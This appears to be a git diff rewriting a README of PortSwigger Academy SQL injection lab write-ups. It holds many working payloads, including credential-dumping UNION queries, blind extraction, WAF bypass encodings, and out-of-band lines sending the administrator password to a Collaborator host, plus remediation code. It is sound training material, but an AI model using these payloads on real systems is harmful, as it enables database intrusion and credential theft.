@@ -1,645 +1,338 @@
-# 💉 SQL Injection Vulnerabilities — Complete Lab Series
-
-<div align="center">
+# SQL Injection — 18 Labs, All Completed
 
 ![SQL Injection](https://img.shields.io/badge/Category-SQL%20Injection-FF4500?style=for-the-badge&logo=databricks&logoColor=white)
 ![Labs Completed](https://img.shields.io/badge/Labs%20Completed-18%2F18-00C853?style=for-the-badge&logo=checkmarx&logoColor=white)
 ![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice%20to%20Expert-9C27B0?style=for-the-badge&logo=target&logoColor=white)
-![Status](https://img.shields.io/badge/Status-100%25%20Complete-00BCD4?style=for-the-badge&logo=statuspage&logoColor=white)
 ![Platform](https://img.shields.io/badge/Platform-PortSwigger%20Academy-FF6D00?style=for-the-badge&logo=hackaday&logoColor=white)
 
-<br>
-
-```
- ____   ___  _
-/ ___| / _ \| |
-\___ \| | | | |
- ___) | |_| | |___
-|____/ \__\_\_____|
-
- ___ _   _     _ _____ ____ _____ ___ ___  _   _
-|_ _| \ | |   | | ____/ ___|_   _|_ _/ _ \| \ | |
- | ||  \| |_  | |  _|| |     | |  | | | | |  \| |
- | || |\  | |_| | |__| |___  | |  | | |_| | |\  |
-|___|_| \_|\___/|_____\____| |_| |___\___/|_| \_|
-```
-
-**18 Labs · 3 Difficulty Tiers · 60+ Hours of Hands-On Database Exploitation**
-
-[🔗 Main Repository](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) • [👤 About Me](https://github.com/Gurpreet-Singh-offensive-Security) • [📧 Contact](mailto:gskhalsa6245@gmail.com) • [🔐 Auth Labs](./AUTHENTICATION/)
-
-</div>
+[Main Repo](https://github.com/Gurpreet-Singh-offensive-Security/Offensive-Security-Labs) · [Auth Labs](./AUTHENTICATION/) · [Contact](mailto:gskhalsa6245@gmail.com)
 
 ---
 
-## 📊 Achievement Dashboard
+Finished all 18 PortSwigger SQLi labs — Apprentice through Expert. Writeups below cover what I actually did in each lab, not the theory. The cheat sheet at the bottom is what I kept open while working through the blind injection labs.
 
-<div align="center">
-
-```
-╔══════════════════════════════════════════════════════════════════╗
-║                    🏆  SQL INJECTION MASTERY                     ║
-╠══════════════════════════════════════════════════════════════════╣
-║                                                                  ║
-║  Overall Progress  ████████████████████████████████  100%        ║
-║                                                                  ║
-║  🟢 Apprentice     ██████████████████████████████     9 / 9      ║
-║  🟡 Practitioner   ████████████████████████           8 / 8      ║
-║  🔴 Expert         ████████                           1 / 1      ║
-║                                                                  ║
-║  ⏱️  Time Invested  60+ Hours                                    ║
-║  🛠️  Tools Used     Burp Suite Pro · SQLMap · Python             ║
-║  🗄️  DBs Covered    MySQL · PostgreSQL · Oracle · MSSQL          ║
-║  📋  Docs           Professional Walkthroughs + CVSS             ║
-║                                                                  ║
-╚══════════════════════════════════════════════════════════════════╝
-```
-
-</div>
+**Time spent:** ~60 hours across the full series  
+**Tools:** Burp Suite Pro, SQLMap, Python for a few custom scripts  
+**Databases hit:** MySQL, PostgreSQL, Oracle, MSSQL
 
 ---
 
-## 📖 What is SQL Injection?
+## Labs
 
-SQL Injection (SQLi) is one of the **most dangerous and prevalent** web application vulnerabilities, consistently ranked in the **OWASP Top 10**. It occurs when user-controlled input is embedded into SQL queries without proper sanitization, allowing attackers to manipulate the database engine itself.
+### Apprentice — 9/9
 
-> 📌 *"SQL Injection has been responsible for some of the largest data breaches in history — including the 2012 LinkedIn breach (117M records), the 2008 Heartland Payment Systems breach (134M cards), and countless others."*
+These build the foundation. If you skip straight to blind injection without doing UNION labs first, you'll struggle to understand what you're actually looking for in the response.
 
-### ⚠️ Real-World Business Impact
-
-| Impact Category | Consequence | CVSS Score |
-|----------------|-------------|------------|
-| 🚨 **Database Dump** | Full extraction of all sensitive data | `10.0 Critical` |
-| 🔑 **Authentication Bypass** | Admin access without credentials | `9.8 Critical` |
-| 🗑️ **Data Destruction** | DROP/TRUNCATE table — irreversible data loss | `9.1 Critical` |
-| 🖥️ **OS Command Execution** | RCE via `xp_cmdshell` or `INTO OUTFILE` | `10.0 Critical` |
-| 🔒 **Privilege Escalation** | Database admin → OS root | `9.8 Critical` |
-| 👁️ **Blind Data Exfiltration** | Silent exfil via boolean/timing channels | `8.5 High` |
-| 💰 **Financial Fraud** | Manipulate transactions & pricing logic | `9.0 Critical` |
-
-### 📈 Industry Statistics
-
-```
-💸  Average breach cost involving SQLi:   $4.45M    (IBM 2023)
-📊  Web attacks using SQLi:               65%+      (Verizon DBIR)
-🕐  Average time to detect:              277 days   (IBM Security)
-🏦  Records exposed in top SQLi breaches: 1 Billion+
-⚖️  GDPR fines possible:                 €20M or 4% annual revenue
-```
+| # | Lab | What I did | Technique |
+|---|-----|-----------|-----------|
+| 1 | [WHERE Clause — Retrieve Hidden Data](./LAB-1-SQL-Injection.md) | Injected `' OR 1=1--` into the category filter. Turns the WHERE into an always-true condition — got back all rows including ones the app was hiding. Confirmed by the jump in product count. | In-Band |
+| 2 | [Login Bypass](./LAB-2-SQL-Injection.md) | Entered `administrator'--` as the username. Closes the string, comments out the password check entirely. Server just matched on username. Got admin without touching the password field. | Auth Bypass |
+| 3 | [UNION — Determine Column Count](./LAB-3-SQL-Injection.md) | Incremented `ORDER BY` until I hit an error at 3 — so 2 columns. Cross-checked with `UNION SELECT NULL,NULL--`. Always do both, ORDER BY can behave differently depending on the DB. | UNION |
+| 4 | [UNION — Find String Columns](./LAB-4-SQL-Injection.md) | 2 columns confirmed. Swapped NULLs for `'test'` one at a time. Second column reflected the string back. You need at least one string column before you can pull real data. | UNION |
+| 5 | [UNION — Retrieve Data from Other Tables](./LAB-5-SQL-Injection.md) | Both columns string-compatible. `UNION SELECT username,password FROM users--` — credentials dumped straight into the product listing. Plain text. | UNION |
+| 6 | [UNION — Multiple Values in Single Column](./LAB-6-SQL-Injection.md) | Only one usable column this time. Concatenated with `username\|\|'~'\|\|password` — tilde as a delimiter so I could split it client-side. Got everything in one shot. | UNION |
+| 7 | [DB Version — Oracle](./LAB-7-SQL-Injection.md) | Oracle needs `FROM dual` in every SELECT — trips people up if they're used to MySQL. `UNION SELECT BANNER,NULL FROM v$version--` returned the full version banner. | Fingerprinting |
+| 8 | [DB Version — MySQL/MSSQL](./LAB-8-SQL-Injection.md) | `UNION SELECT @@version,NULL#` — MySQL needs `#` or a space after `--` for comment syntax, not just `--`. Got the version string, confirmed the DB engine. | Fingerprinting |
+| 9 | [List DB Contents — non-Oracle](./LAB-9-SQL-Injection.md) | Queried `information_schema.tables` for table names, then `information_schema.columns` once I had the users table name. Final payload dumped credentials. Straightforward but easy to mess up if the table name has a random suffix — it did. | Enumeration |
 
 ---
 
-## 📂 Complete Lab Series — All 18 Labs
+### Practitioner — 8/8
 
-### 🟢 Apprentice Tier — Foundation & Core Techniques
-> *Build a rock-solid understanding of SQL Injection fundamentals*
+This is where it actually gets interesting. No data in the response means you have to read the application's behaviour as a signal — a status code, a delay, a DNS ping. Labs 11–16 took the most time by far.
 
-| # | Lab Title | Key Technique | Attack Type |
-|---|-----------|---------------|-------------|
-| 1 | [SQL Injection WHERE Clause — Retrieve Hidden Data](./LAB-1-SQL-Injection.md) | Category filter parameter is injectable — appended `' OR 1=1--` turns `WHERE category='Gifts'` into always-true condition — all hidden rows including unreleased products returned — confirmed by increased product count in response | `In-Band · UNION` |
-| 2 | [SQL Injection — Login Bypass](./LAB-2-SQL-Injection.md) | Username field injectable — entered `administrator'--` which closes the string and comments out the entire `AND password='...'` clause — server authenticates based on username match alone — full admin session granted without knowing password | `Auth Bypass` |
-| 3 | [SQL Injection UNION — Determine Column Count](./LAB-3-SQL-Injection.md) | Injected `ORDER BY 1--` then incremented to `ORDER BY 2--` then `ORDER BY 3--` — error thrown at 3 confirms 2 columns exist — cross-verified with `UNION SELECT NULL,NULL--` returning no error — column count established before data extraction | `UNION Based` |
-| 4 | [SQL Injection UNION — Find Columns with Text](./LAB-4-SQL-Injection.md) | Column count already known as 2 — tested `UNION SELECT 'test',NULL--` then `UNION SELECT NULL,'test'--` — second payload returned `'test'` string in response — confirmed column 2 accepts string data type — required before injecting real payload | `UNION Based` |
-| 5 | [SQL Injection UNION — Retrieve Data from Other Tables](./LAB-5-SQL-Injection.md) | Column count 2 confirmed, both string-compatible — injected `UNION SELECT username,password FROM users--` — full users table dumped directly into product listing response — administrator credentials visible in plaintext — account compromised | `UNION Based` |
-| 6 | [SQL Injection UNION — Retrieve Multiple Values in Single Column](./LAB-6-SQL-Injection.md) | Only one string-compatible column available — used Oracle/PostgreSQL concatenation `UNION SELECT NULL,username\|\|'~'\|\|password FROM users--` — tilde delimiter separates username and password within single column — all credentials extracted in one request | `UNION Based` |
-| 7 | [SQL Injection — Query the Database Type and Version (Oracle)](./LAB-7-SQL-Injection.md) | Oracle requires `FROM` clause in every `SELECT` — used `FROM dual` dummy table — injected `UNION SELECT BANNER,NULL FROM v$version--` — Oracle version banner string returned in response — DB type and exact version fingerprinted for targeted follow-up attacks | `Fingerprinting` |
-| 8 | [SQL Injection — Query the Database Type and Version (MySQL/MSSQL)](./LAB-8-SQL-Injection.md) | MySQL requires `#` comment style or space after `--` — injected `UNION SELECT @@version,NULL#` — global system variable `@@version` returned full MySQL/MSSQL version string — confirmed DB engine and version to tailor syntax for subsequent exploitation | `Fingerprinting` |
-| 9 | [SQL Injection — List the Database Contents (non-Oracle)](./LAB-9-SQL-Injection.md) | Queried `information_schema.tables` to list all table names — identified users table name — queried `information_schema.columns WHERE table_name='users_abcxyz'` to get column names — final payload `UNION SELECT username_col,password_col FROM users_abcxyz--` dumped credentials — administrator password retrieved — account compromised | `Enumeration` |
+| # | Lab | What I did | Technique |
+|---|-----|-----------|-----------|
+| 10 | [List DB Contents — Oracle](./LAB-10-SQL-Injection.md) | Oracle doesn't have `information_schema`. Used `all_tables` and `all_columns` instead. Same end result — just different catalog syntax. Worth knowing cold if you're doing Oracle engagements. | Enumeration |
+| 11 | [Blind — Conditional Responses](./LAB-11-SQL-Injection.md) | Injected into the TrackingId cookie. `AND 1=1--` kept "Welcome back" in the response. `AND 1=2--` removed it. Used that as a boolean oracle to pull the password one character at a time with `SUBSTRING`. Intruder Cluster Bomb to automate it — response length was the differentiator. | Blind Boolean |
+| 12 | [Blind — Conditional Errors](./LAB-12-SQL-Injection.md) | No page difference on true/false. Switched to error-based oracle — division by zero in a CASE expression on Oracle. True condition = 500 error, false = 200. HTTP status becomes your data channel. Same char-by-char extraction with Intruder, filtering on response code instead of length. | Blind Error |
+| 13 | [Blind — Time Delays](./LAB-13-SQL-Injection.md) | Nothing in the response at all — not even a status code difference. `'; SELECT pg_sleep(10)--` caused a 10s hang. That confirmed both the injection point and that it was PostgreSQL. No extraction yet, just confirming the channel exists. | Blind Time |
+| 14 | [Blind — Time Delays + Data Exfiltration](./LAB-14-SQL-Injection.md) | Built on Lab 13. Conditional sleep: `CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END`. One thread in Intruder's Resource Pool — if you run concurrent threads the timing breaks and you get garbage. Slow but it works. | Blind Time |
+| 15 | [Blind — OOB Interaction](./LAB-15-SQL-Injection.md) | App was processing the query async. No boolean signal, no timing signal. Dropped an Oracle XXE payload pointing at a Burp Collaborator subdomain. Got a DNS hit back. That's your confirmation — the DB can reach out. | Blind OOB |
+| 16 | [Blind — OOB Data Exfiltration](./LAB-16-SQL-Injection.md) | Extended Lab 15. Embedded the password query inside the DNS lookup itself — `(SELECT password FROM users WHERE username='administrator')` as a subdomain prefix. Collaborator received the lookup with the password in the hostname. Read it straight from the interaction log. | Blind OOB |
+| 17 | [Filter Bypass via XML Encoding](./LAB-17-SQL-Injection.md) | WAF was blocking SQLi keywords in the request body. Payload was inside an XML parameter. Hex-encoded the keywords — `&#x53;ELECT` instead of `SELECT`. WAF didn't decode before matching. The XML parser on the backend did. Payload executed cleanly. | WAF Bypass |
 
 ---
 
-### 🟡 Practitioner Tier — Advanced Exploitation Techniques
-> *Master blind injection, out-of-band channels, and database-specific attacks*
+### Expert — 1/1
 
-| # | Lab Title | Key Technique | Attack Type |
-|---|-----------|---------------|-------------|
-| 10 | [SQL Injection — List the Database Contents (Oracle)](./LAB-10-SQL-Injection.md) | Oracle has no `information_schema` — used Oracle-specific catalog `SELECT table_name FROM all_tables` to enumerate tables — identified users table — queried `SELECT column_name FROM all_columns WHERE table_name='USERS_ABCXYZ'` — extracted column names — final `UNION SELECT` dumped plaintext credentials — administrator account compromised | `Enumeration` |
-| 11 | [Blind SQLi — Conditional Responses](./LAB-11-SQL-Injection.md) | No data returned in response — injected into `TrackingId` cookie — `' AND 1=1--` returned "Welcome back" message — `' AND 1=2--` removed it — boolean oracle confirmed — queried `AND (SELECT 'x' FROM users WHERE username='administrator')='x'` to confirm table exists — extracted password char-by-char using `AND SUBSTRING(password,1,1)='a'` — Burp Intruder Cluster Bomb across all positions and characters — response length difference identified correct chars — full password reconstructed — account compromised | `Blind · Boolean` |
-| 12 | [Blind SQLi — Conditional Errors](./LAB-12-SQL-Injection.md) | No visual page difference on true/false — injected `' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--` — division by zero on true condition forces Oracle error (500) vs normal response (200) — HTTP status code used as boolean oracle — password extracted char-by-char using `CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END` — Intruder automated all positions — error response = correct character — full password obtained | `Blind · Error` |
-| 13 | [Blind SQLi — Time Delays](./LAB-13-SQL-Injection.md) | No response difference at all — injected time-based payload into cookie — `'; SELECT pg_sleep(10)--` (PostgreSQL) caused 10 second response delay confirming injection — MySQL equivalent `'; SELECT SLEEP(10)--` — MSSQL `'; WAITFOR DELAY '0:0:10'--` — Oracle `'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) FROM dual--` — delay vs instant response confirmed injectable parameter and DB type | `Blind · Time` |
-| 14 | [Blind SQLi — Time Delays and Data Exfiltration](./LAB-14-SQL-Injection.md) | Time delay confirmed as oracle — extracted data char-by-char using conditional sleep — payload `'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--` — Burp Intruder with Resource Pool (1 thread) to preserve timing accuracy — 5s delay = correct character — no delay = wrong — all positions iterated — full administrator password reconstructed — account compromised | `Blind · Time` |
-| 15 | [Blind SQLi — Out-of-Band Interaction](./LAB-15-SQL-Injection.md) | Application processed query async — no timing or boolean feedback — used Burp Collaborator to generate unique OOB subdomain — Oracle payload `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://COLLABORATOR-SUBDOMAIN/"> %r;]>'),'/l') FROM dual--` — DNS lookup received in Collaborator confirming outbound interaction — OOB channel established and verified | `Blind · OOB` |
-| 16 | [Blind SQLi — Out-of-Band Data Exfiltration](./LAB-16-SQL-Injection.md) | OOB channel confirmed — embedded live query inside DNS subdomain to carry exfiltrated data — Oracle payload `' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % r SYSTEM "http://'\|\|(SELECT password FROM users WHERE username='administrator')\|\|'.COLLABORATOR-SUBDOMAIN/"> %r;]>'),'/l') FROM dual--` — Collaborator received DNS lookup with administrator password as subdomain prefix — decoded from interaction log — account compromised | `Blind · OOB` |
-| 17 | [SQL Injection — Filter Bypass via XML Encoding](./LAB-17-SQL-Injection.md) | WAF detected and blocked standard SQLi keywords in request body — payload delivered inside XML `<storeId>` parameter — used XML hex entity encoding to obfuscate: `S` → `&#x53;` making `&#x53;ELECT` — WAF failed to decode and match signature — backend XML parser decoded entities before passing to DB — full `UNION SELECT` executed — credentials extracted — WAF bypass successful | `WAF Bypass` |
+| # | Lab | What I did | Technique |
+|---|-----|-----------|-----------|
+| 18 | [Visible Error-Based SQLi](./LAB-18-SQL-Injection.md) | Verbose errors were on. Injected `AND 1=CAST((SELECT username FROM users LIMIT 1) AS integer)--`. PostgreSQL tries to cast the string to int, fails, and throws the value back in the error message. Did the same with the password column. No blind technique needed — the DB just handed it over. | Error Based |
 
 ---
 
-### 🔴 Expert Tier — Cutting-Edge Attack Chains
-> *Elite-level exploitation requiring chained techniques and deep database knowledge*
+## Techniques
 
-| # | Lab Title | Key Technique | Attack Type |
-|---|-----------|---------------|-------------|
-| 18 | [Visible Error-Based SQL Injection](./LAB-18-SQL-Injection.md) | Verbose database errors enabled — injected `' AND 1=CAST((SELECT 1) AS int)--` to confirm error-based channel — then `' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--` — DB attempted to cast string username as integer — error message included actual value: `invalid input syntax for type integer: "administrator"` — repeated with password column — full plaintext password leaked directly inside PostgreSQL error message — account compromised without any blind technique | `Error Based` |
+### UNION Injection
 
----
+Before you can pull data, you need to know the column count and which columns reflect text. Both steps are non-negotiable — get either wrong and UNION fails silently or throws an error that misleads you.
 
-## 🔎 Attack Techniques Deep-Dive
-
-### ⚡ Technique 1 — UNION-Based Injection
-
-The most straightforward SQLi class. Append a `UNION SELECT` to the original query and retrieve data from arbitrary tables.
-
-**Step-by-step:**
 ```sql
--- Step 1: Determine number of columns
-' ORDER BY 1--    → works
-' ORDER BY 2--    → works
-' ORDER BY 3--    → ERROR → 2 columns confirmed
+-- Column count via ORDER BY (increment until error)
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--   -- error here = 2 columns
 
--- Step 2: Find text-compatible columns
+-- Verify with UNION (NULLs are type-safe)
 ' UNION SELECT NULL,NULL--
-' UNION SELECT 'test',NULL--   → 'test' appears → col 1 is string
 
--- Step 3: Exfiltrate data
-' UNION SELECT username, password FROM users--
+-- Find string columns (swap NULLs one at a time)
+' UNION SELECT 'test',NULL--
+' UNION SELECT NULL,'test'--
 
--- Step 4: Concatenate when only 1 text column available
-' UNION SELECT NULL, username||'~'||password FROM users--
+-- Pull data
+' UNION SELECT username,password FROM users--
+
+-- Only one string column available? Concatenate
+' UNION SELECT NULL,username||'~'||password FROM users--
 ```
 
-**Database Version Fingerprinting:**
+Version fingerprinting by DB:
+
 ```sql
--- Oracle (requires FROM dual)
-' UNION SELECT BANNER, NULL FROM v$version--
-
--- MySQL / MSSQL
-' UNION SELECT @@version, NULL--
-
--- PostgreSQL
-' UNION SELECT version(), NULL--
+' UNION SELECT BANNER,NULL FROM v$version--      -- Oracle
+' UNION SELECT @@version,NULL--                  -- MySQL, MSSQL
+' UNION SELECT version(),NULL--                  -- PostgreSQL
 ```
 
 ---
 
-### 🔍 Technique 2 — Boolean-Based Blind Injection
+### Boolean Blind
 
-No data in response — instead, two different page states (true vs false) serve as an oracle.
+The page has two states — something changes when your condition is true vs false. That's all you need. You ask yes/no questions and read the answer from the page.
 
 ```sql
--- Confirm injection point
-' AND 1=1--   →  Normal page  ✅
-' AND 1=2--   →  Altered/blank page ✅ (boolean confirmed)
+-- Establish the oracle
+' AND 1=1--    -- normal page
+' AND 1=2--    -- something changes (message disappears, element missing, length diff)
 
--- Enumerate table existence
+-- Confirm the table exists before wasting time extracting
 ' AND (SELECT 'x' FROM users LIMIT 1)='x'--
 
--- Extract password character by character
+-- Extract char by char (Intruder automates this)
 ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
--- Automate with Burp Intruder — 128 requests per character position
--- Filter on response length difference to find correct character
+
+-- Automate: Cluster Bomb attack in Intruder
+-- Position 1 = character index (1-20)
+-- Position 2 = character value (a-z, 0-9, A-Z)
+-- Differentiator: response length
 ```
 
 ---
 
-### ⏱️ Technique 3 — Time-Based Blind Injection
+### Time-Based Blind
 
-Zero visual difference in response — use deliberate time delays as the data oracle.
+When there's genuinely nothing to read in the response — no length diff, no status diff — timing is the last resort. Works well, just slow.
 
 ```sql
--- Confirm time-based injection
-'; SELECT SLEEP(10)--                          -- MySQL
-'; SELECT pg_sleep(10)--                       -- PostgreSQL
-'; EXEC xp_cmdshell('ping -n 10 127.0.0.1')-- -- MSSQL
-'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) FROM dual-- -- Oracle
+-- Confirm the channel first (flat delay, no condition)
+'; SELECT pg_sleep(10)--                                           -- PostgreSQL
+'; SELECT SLEEP(10)--                                              -- MySQL
+'; WAITFOR DELAY '0:0:10'--                                        -- MSSQL
+'; SELECT DBMS_PIPE.RECEIVE_MESSAGE(('a'),10) FROM dual--          -- Oracle
 
--- Conditional time delay for data extraction
-'; IF (SELECT COUNT(username) FROM users WHERE username='administrator')=1
-   WAITFOR DELAY '0:0:10'--                    -- MSSQL
-
--- PostgreSQL char-by-char extraction
+-- Conditional delay for extraction (PostgreSQL)
 '; SELECT CASE WHEN (SUBSTRING(password,1,1)='a')
-   THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users
-   WHERE username='administrator'--
+   THEN pg_sleep(5) ELSE pg_sleep(0) END
+   FROM users WHERE username='administrator'--
+
+-- Important: 1 thread only in Intruder Resource Pool
+-- Multiple threads destroy timing accuracy
 ```
 
 ---
 
-### 📶 Technique 4 — Out-of-Band (OOB) Exfiltration
+### Out-of-Band Exfiltration
 
-When there's zero response feedback — force the database to make a **DNS/HTTP request** carrying exfiltrated data as a subdomain.
+Used when the app processes queries asynchronously and you get zero feedback — no boolean, no timing. Make the DB initiate a DNS request carrying your data as a subdomain.
 
 ```sql
--- Oracle DNS lookup (Burp Collaborator)
+-- Oracle (Burp Collaborator) — data exfil via DNS
 ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE root [ <!ENTITY % remote SYSTEM
-"http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
+<!DOCTYPE root [<!ENTITY % remote SYSTEM
+"http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-COLLABORATOR-ID.oastify.com/"> %remote;]>'),'/l') FROM dual--
 
--- MSSQL DNS + data exfil
-'; exec master..xp_dirtree
-'//'+( SELECT password FROM users WHERE username='administrator' )+'.burpcollaborator.net/a'--
+-- MSSQL — xp_dirtree DNS lookup
+'; exec master..xp_dirtree '//'+(SELECT password FROM users WHERE username='administrator')+'.YOUR-COLLABORATOR-ID.oastify.com/a'--
 
--- Technique: check Collaborator for incoming DNS lookup
--- Subdomain = exfiltrated value
+-- Check Collaborator for incoming DNS — the subdomain prefix is your value
 ```
 
 ---
 
-### 🛡️ Technique 5 — WAF Bypass via Encoding
+### WAF Bypass — XML Encoding
 
-When a Web Application Firewall blocks keywords like `UNION`, `SELECT`, `FROM`:
+If you're injecting into an XML parameter and getting blocked, hex entity encoding is usually the first thing to try. Most WAFs match on raw keyword strings pre-decode.
 
 ```xml
-<!-- XML Context — use hex entity encoding to obfuscate -->
-<storeId>
-  1 &#x55;NION &#x53;ELECT NULL--
-</storeId>
+<!-- Instead of SELECT, use hex entities -->
+<storeId>1 &#x55;NION &#x53;ELECT NULL--</storeId>
 
-<!-- URL Double Encoding -->
-%2527 → decoded twice → '
+<!-- WAF sees: 1 &#x55;NION &#x53;ELECT NULL-- (no keyword match) -->
+<!-- Backend XML parser decodes it before the query runs -->
+```
 
-<!-- Case variation (some WAFs are case-sensitive) -->
-uNiOn SeLeCt
+Other bypass approaches worth knowing:
 
-<!-- Comment insertion (MySQL) -->
-UN/**/ION SEL/**/ECT
-
-<!-- Whitespace substitution -->
-UNION%09SELECT   (tab instead of space)
-UNION%0ASELECT   (newline instead of space)
+```
+Case variation:          uNiOn SeLeCt
+Comment insertion:       UN/**/ION SEL/**/ECT   (MySQL)
+Whitespace substitution: UNION%09SELECT         (tab)
+Double URL encoding:     %2527 → '
 ```
 
 ---
 
-### ⚡ Technique 6 — Error-Based Data Extraction
+### Error-Based Extraction
 
-Force the database to include query results **inside its own error messages**:
+When verbose errors are enabled, you can skip blind techniques entirely. Force a type mismatch — the DB fails to cast your string to an integer and includes the actual value in the error message.
 
 ```sql
--- PostgreSQL: cast-to-wrong-type error leaks value
-' AND CAST((SELECT password FROM users LIMIT 1) AS integer)--
--- Error: invalid input syntax for type integer: "s3cur3p4ssw0rd"
---                                                ↑ password leaked in error!
+-- PostgreSQL
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS integer)--
+-- Returns: ERROR: invalid input syntax for type integer: "actualpasswordhere"
 
--- Oracle: XMLType error
-' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT password FROM users WHERE username='administrator'))--
-
--- MSSQL: convert error
+-- MSSQL
 ' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--
+
+-- Oracle
+' AND 1=CTXSYS.DRITHSX.SN(user,(SELECT password FROM users WHERE username='administrator'))--
 ```
 
 ---
 
-## 🗄️ Database Cheat Sheet
+## DB Reference
 
-### Schema Enumeration Per Database
+### Enumerating Schema
 
 ```sql
-╔══════════════════╦════════════════════════════════════════════════════╗
-║ Database         ║ List Tables Query                                  ║
-╠══════════════════╬════════════════════════════════════════════════════╣
-║ MySQL/MSSQL/PgSQL║ SELECT table_name FROM information_schema.tables   ║
-║                  ║   WHERE table_schema = 'public'                    ║
-╠══════════════════╬════════════════════════════════════════════════════╣
-║ Oracle           ║ SELECT table_name FROM all_tables                  ║
-╚══════════════════╩════════════════════════════════════════════════════╝
+-- MySQL / PostgreSQL / MSSQL
+SELECT table_name FROM information_schema.tables WHERE table_schema='public'
+SELECT column_name FROM information_schema.columns WHERE table_name='users'
 
-╔══════════════════╦════════════════════════════════════════════════════╗
-║ Database         ║ List Columns Query                                 ║
-╠══════════════════╬════════════════════════════════════════════════════╣
-║ MySQL/MSSQL/PgSQL║ SELECT column_name FROM information_schema.columns ║
-║                  ║   WHERE table_name = 'users'                       ║
-╠══════════════════╬════════════════════════════════════════════════════╣
-║ Oracle           ║ SELECT column_name FROM all_columns                ║
-║                  ║   WHERE table_name = 'USERS'                       ║
-╚══════════════════╩════════════════════════════════════════════════════╝
+-- Oracle (no information_schema)
+SELECT table_name FROM all_tables
+SELECT column_name FROM all_columns WHERE table_name='USERS'
 ```
 
-### String Concatenation Syntax
+### Concatenation
 
-| Database | Syntax | Example |
-|----------|--------|---------|
-| **Oracle** | `\|\|` | `'foo'\|\|'bar'` |
-| **MSSQL** | `+` | `'foo'+'bar'` |
-| **PostgreSQL** | `\|\|` | `'foo'\|\|'bar'` |
-| **MySQL** | `CONCAT()` | `CONCAT('foo','bar')` |
+| DB | Syntax |
+|----|--------|
+| Oracle | `'a'\|\|'b'` |
+| MSSQL | `'a'+'b'` |
+| PostgreSQL | `'a'\|\|'b'` |
+| MySQL | `CONCAT('a','b')` |
 
-### Comment Syntax
+### Comments
 
-| Database | Inline Comment | Block Comment |
-|----------|----------------|---------------|
-| **MySQL** | `--` or `#` | `/* ... */` |
-| **MSSQL** | `--` | `/* ... */` |
-| **PostgreSQL** | `--` | `/* ... */` |
-| **Oracle** | `--` | `/* ... */` |
+| DB | Style |
+|----|-------|
+| MySQL | `--` or `#` (note: `--` needs trailing space) |
+| MSSQL | `--` |
+| PostgreSQL | `--` |
+| Oracle | `--` |
 
 ---
 
-## 🛡️ Defense & Remediation
+## Fix
 
-### ✅ Parameterized Queries (Primary Defense)
+Parameterized queries. That's it. Everything else — input validation, WAFs, error suppression — is layered on top and none of it substitutes for this.
 
 ```python
-# ❌ VULNERABLE — string concatenation
+# Don't do this
 query = "SELECT * FROM products WHERE category = '" + category + "'"
 
-# ✅ SECURE — parameterized query (Python)
+# Do this
 query = "SELECT * FROM products WHERE category = %s"
 cursor.execute(query, (category,))
+```
 
-# ✅ SECURE — prepared statement (Java)
+```javascript
+// Node.js
+const result = await pool.query(
+  'SELECT * FROM users WHERE username = $1 AND password = $2',
+  [username, password]
+);
+```
+
+```java
+// Java
 PreparedStatement stmt = conn.prepareStatement(
     "SELECT * FROM products WHERE category = ?"
 );
 stmt.setString(1, category);
 ```
 
-```javascript
-// ✅ SECURE — Node.js with parameterized query
-const query = 'SELECT * FROM users WHERE username = $1 AND password = $2';
-const result = await pool.query(query, [username, password]);
-```
-
-```csharp
-// ✅ SECURE — C# with SqlCommand
-SqlCommand cmd = new SqlCommand(
-    "SELECT * FROM users WHERE username = @user AND password = @pass", conn);
-cmd.Parameters.AddWithValue("@user", username);
-cmd.Parameters.AddWithValue("@pass", password);
-```
-
-### ✅ Defense-in-Depth Layers
-
-```
-Layer 1 — Input Validation
-  ├─ Allowlist expected formats (e.g. only alphanumeric for usernames)
-  ├─ Reject unexpected characters (', ", --, ;, /*)
-  └─ Validate data type, length, and range
-
-Layer 2 — Parameterized Queries / ORM
-  ├─ NEVER build queries via string concatenation
-  ├─ Use ORM (SQLAlchemy, Hibernate, Entity Framework)
-  └─ Stored procedures with typed parameters
-
-Layer 3 — Least Privilege
-  ├─ DB user should only have SELECT on needed tables
-  ├─ No DBA/root DB credentials in app config
-  └─ Separate read/write accounts
-
-Layer 4 — Error Handling
-  ├─ Generic error messages to users (no DB details)
-  ├─ Detailed errors only in server logs
-  └─ Never expose stack traces or query strings
-
-Layer 5 — WAF & Monitoring
-  ├─ ModSecurity / AWS WAF rules for SQLi patterns
-  ├─ Anomaly detection on query patterns
-  └─ Alert on UNION, SLEEP, INFORMATION_SCHEMA in logs
-```
-
-### Security Checklist
-
-| Control | Status | Priority |
-|---------|--------|----------|
-| 🔐 Parameterized queries everywhere | Required | 🔴 Critical |
-| 🗄️ Least-privilege DB accounts | Required | 🔴 Critical |
-| 🚫 No raw string SQL construction | Required | 🔴 Critical |
-| 🛡️ WAF with SQLi ruleset | Recommended | 🟠 High |
-| 📋 Generic error messages | Required | 🟠 High |
